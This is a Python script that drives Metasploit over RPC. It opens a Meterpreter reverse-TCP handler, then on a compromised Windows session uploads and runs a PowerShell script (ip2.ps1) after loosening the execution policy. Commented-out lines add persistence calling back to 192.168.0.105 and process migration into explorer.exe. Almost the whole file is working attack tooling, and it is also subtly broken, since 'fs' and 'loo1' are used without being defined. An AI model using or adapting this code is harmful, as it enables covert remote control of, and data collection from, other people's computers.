from pymetasploit3.msfrpc import MsfRpcClient
from pymetasploit3.msfconsole import MsfRpcConsole
import time
import os
import sys

client = MsfRpcClient('yourpassword11', ssl=True)
exploit = client.modules.use('exploit', 'multi/handler')
exploit['ExitOnSession'] = False
payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
payload['LHOST'] = '0.0.0.0'
payload['LPORT'] = 5102
count=0
exploit.execute(payload=payload)
#time.sleep()
op="yes"
photo=0
#while(op=="yes"):
'''x=client.sessions.list
for i in range(1,100):
	try:
		print("id : - ",i ,"name : -" , x[str(i)]["info"])	
	except:
		print("",end="")
	continue
inp =(input("Enter id : - "))'''

def get_windows_location(inp):

	shell = client.sessions.session(inp)
	#shell.write('run persistence -U -i 5 -p 111 -r 192.168.0.105')
	#shell.write('migrate -N explorer.exe')
	location_path = '/root/meta/face/images/Device' + str(inp)
	#file_name = "WindowsDevice"+str(inp)+".txt"
	file_name="Device" + str(inp) + ".txt"
	complete_name = os.path.join(location_path,file_name)
	f = open(file_name, 'w')
	sys.stdout = fs
	for i in range(0,2):
		if(loo1==0):
			shell.write('upload ip2.ps1')
			time.sleep(3)		
			shell.write('shell')
			time.sleep(3)		
			shell.write('powershell Set-ExecutionPolicy RemoteSigned')
			time.sleep(3)		
			#shell.write('copy ip2.ps1 ip3.ps1')
			#time.sleep(3)		
			#shell.write('powershell')
			loo1+=1
		if(loo1==1):
			time.sleep(3)		
			#shell.write('powershell ".\ip2.ps1 > output.txt" && exit')
			shell.write('powershell ".\ip2.ps1"')
			time.sleep(3)
			#shell.write('exit')
			loo1+=1
		if(loo1==2):
			#shell.write('kill')
			#time.sleep(3)
			#shell.write('download output.txt')
			#shell.write('sysinfo')
			print(shell.read())
	f.close()

#get_windows_location(inp)
